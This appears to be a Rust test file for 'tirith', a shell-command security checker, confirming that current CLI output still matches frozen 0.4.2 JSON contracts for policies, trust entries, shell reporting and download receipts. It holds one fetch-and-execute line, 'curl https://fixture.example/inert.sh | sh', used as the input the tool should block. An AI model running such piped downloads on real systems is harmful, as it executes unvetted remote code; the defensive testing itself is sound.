//! Recheck the retained 0.4.2 reader contracts against the current CLI.
use serde::Deserialize;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};
use std::process::Command;
use tirith_test_support::GlobalStateGuard;

const CONTENT: &[u8] = b"echo inert compatibility fixture\n";
const PIPE: &str = "curl https://fixture.example/inert.sh | sh";

#[derive(Deserialize)]
struct Capture {
    schema_version: u32,
    cases: Vec<Contract>,
}

#[derive(Deserialize)]
struct Contract {
    case: String,
    client: String,
    exit_code: i32,
    json_kind: String,
    top_level_keys: Option<Vec<String>>,
    selected_fields: serde_json::Map<String, Value>,
}

fn fixture() -> Capture {
    serde_json::from_str(include_str!(
        "../../../tests/fixtures/cycle-0.4.2/cli-reader-compatibility.json"
    ))
    .unwrap()
}

fn write(path: PathBuf, bytes: &[u8], originals: &mut Vec<(PathBuf, Vec<u8>)>) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(&path, bytes).unwrap();
    originals.push((path, bytes.to_vec()));
}

fn selected<'a>(value: &'a Value, key: &str) -> &'a Value {
    match key {
        "policy_paranoia" => &value["policy"]["paranoia"],
        "verified_blocking" => &value["protection_evidence"]["verified_blocking"],
        _ => &value[key],
    }
}

fn command_case(name: &str, state: &GlobalStateGuard) -> (Vec<String>, Vec<(PathBuf, Vec<u8>)>) {
    let mut originals = Vec::new();
    let config = tirith_core::policy::config_dir().unwrap();
    let data = tirith_core::policy::data_dir().unwrap();
    let check = |text: &str| {
        [
            "check",
            "--no-daemon",
            "--json",
            "--shell",
            "posix",
            "--",
            text,
        ]
        .map(str::to_owned)
        .to_vec()
    };
    let args = match name {
        "clean-command" => check("echo compatibility"),
        "blocked-command" => check(PIPE),
        "personal-policy" | "repository-policy" => {
            if name == "personal-policy" {
                write(config.join("policy.yaml"), b"paranoia: 3\n", &mut originals);
            } else {
                std::fs::create_dir(state.roots().cwd.join(".git")).unwrap();
                write(
                    state.roots().cwd.join(".tirith/policy.yaml"),
                    b"allowlist: ['fixture.example']\n",
                    &mut originals,
                );
            }
            ["policy", "effective", "--format", "json"]
                .map(str::to_owned)
                .to_vec()
        }
        name if name.starts_with("legacy-trust-") => {
            let expiry = match name {
                "legacy-trust-permanent" => Value::Null,
                "legacy-trust-expired" => json!("2000-01-01T00:00:00Z"),
                "legacy-trust-invalid-expiry" => json!("not-a-time"),
                _ => panic!("unknown frozen case {name}"),
            };
            write(
                config.join("trust.json"),
                &serde_json::to_vec(&json!({"entries":[{"pattern":"fixture.example",
                    "rule_id":null,"ttl_expires":expiry}]}))
                .unwrap(),
                &mut originals,
            );
            check(PIPE)
        }
        name if name.starts_with("reported-shell-") => ["doctor", "--quick", "--format", "json"]
            .map(str::to_owned)
            .to_vec(),
        name if name.starts_with("download-receipt-") => {
            let id = format!("{:x}", Sha256::digest(CONTENT));
            let receipt = json!({"url":"https://fixture.example/inert.sh","final_url":null,
                "redirects":[],"sha256":id,"size":CONTENT.len(),"domains_referenced":[],
                "paths_referenced":[],"analysis_method":"static","privilege":"user",
                "timestamp":"2026-09-12T00:00:00Z","cwd":null,"git_repo":null,"git_branch":null});
            write(
                data.join("receipts").join(format!("{id}.json")),
                &serde_json::to_vec(&receipt).unwrap(),
                &mut originals,
            );
            if name != "download-receipt-cache-missing" {
                let content = if name == "download-receipt-cache-changed" {
                    b"changed".as_slice()
                } else {
                    CONTENT
                };
                write(data.join("cache").join(&id), content, &mut originals);
            }
            match name {
                "download-receipt-list" => vec!["receipt".into(), "list".into(), "--json".into()],
                "download-receipt-last" => vec!["receipt".into(), "last".into(), "--json".into()],
                "download-receipt-verify"
                | "download-receipt-cache-changed"
                | "download-receipt-cache-missing" => {
                    vec!["receipt".into(), "verify".into(), id, "--json".into()]
                }
                _ => panic!("unknown frozen case {name}"),
            }
        }
        _ => panic!("unknown frozen case {name}"),
    };
    (args, originals)
}

fn assert_contract(case: &Contract, value: &Value) {
    let selected_value = match case.json_kind.as_str() {
        "array" => {
            let values = value.as_array().expect("frozen array contract");
            assert_eq!(values.len(), 1, "{} receipt cardinality", case.case);
            &values[0]
        }
        "object" => {
            assert!(value.is_object(), "{} object contract", case.case);
            value
        }
        other => panic!("unknown frozen JSON shape {other}"),
    };
    for (key, expected) in &case.selected_fields {
        assert_eq!(
            selected(selected_value, key),
            expected,
            "{} {key}",
            case.case
        );
    }
    if case.case.starts_with("download-receipt-") {
        assert!(
            selected_value.get("cwd").is_none(),
            "private cwd entered receipt output"
        );
    }
}

fn run_group(prefixes: &[&str], count: usize) {
    let capture = fixture();
    assert_eq!(capture.schema_version, 1);
    assert_eq!(
        capture.cases.len(),
        32,
        "all paired captures must remain present"
    );
    let cases: Vec<_> = capture
        .cases
        .iter()
        .filter(|case| {
            case.client == "candidate"
                && prefixes.iter().any(|prefix| case.case.starts_with(prefix))
        })
        .collect();
    assert_eq!(cases.len(), count);
    let names: BTreeSet<_> = cases.iter().map(|case| &case.case).collect();
    assert_eq!(names.len(), count, "duplicate captured cases");
    for case in cases {
        let state = GlobalStateGuard::new().unwrap();
        let (args, originals) = command_case(&case.case, &state);
        let mut command = Command::new(env!("CARGO_BIN_EXE_tirith"));
        state.apply_to_command(&mut command);
        command
            .current_dir(&state.roots().cwd)
            .env("TIRITH_LOG", "0")
            .env("TIRITH_OFFLINE", "1")
            .args(&args);
        if let Some(mode) = case.case.strip_prefix("reported-shell-") {
            command.env("TIRITH_STATUS", mode);
        }
        let output = command.output().unwrap();
        assert_eq!(
            output.status.code(),
            Some(case.exit_code),
            "{}: {}",
            case.case,
            String::from_utf8_lossy(&output.stderr)
        );
        let value: Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_contract(case, &value);
        if let Some(expected_keys) = &case.top_level_keys {
            let keys: Vec<_> = value.as_object().unwrap().keys().cloned().collect();
            assert_eq!(&keys, expected_keys, "{} public fields changed", case.case);
        }
        let baseline: Vec<_> = capture
            .cases
            .iter()
            .filter(|old| old.client == "baseline" && old.case == case.case)
            .collect();
        assert_eq!(
            baseline.len(),
            1,
            "every current case must retain its baseline"
        );
        assert_eq!(
            baseline[0].exit_code, case.exit_code,
            "legacy exit contract"
        );
        assert_contract(baseline[0], &value);
        for (path, bytes) in originals {
            assert_eq!(
                std::fs::read(&path).unwrap(),
                bytes,
                "reader changed fixture {}",
                Path::new(&path).display()
            );
        }
    }
}

#[test]
fn policy_and_decision_readers_preserve_captured_042_contracts() {
    run_group(
        &[
            "clean-command",
            "blocked-command",
            "personal-policy",
            "repository-policy",
        ],
        4,
    );
}

#[test]
fn legacy_trust_expiry_preserves_captured_042_decisions() {
    run_group(&["legacy-trust-"], 3);
}

#[test]
fn inherited_shell_modes_preserve_reporting_without_current_proof() {
    run_group(&["reported-shell-"], 4);
}

#[test]
fn download_receipt_readers_preserve_captured_042_contracts() {
    run_group(&["download-receipt-"], 5);
}
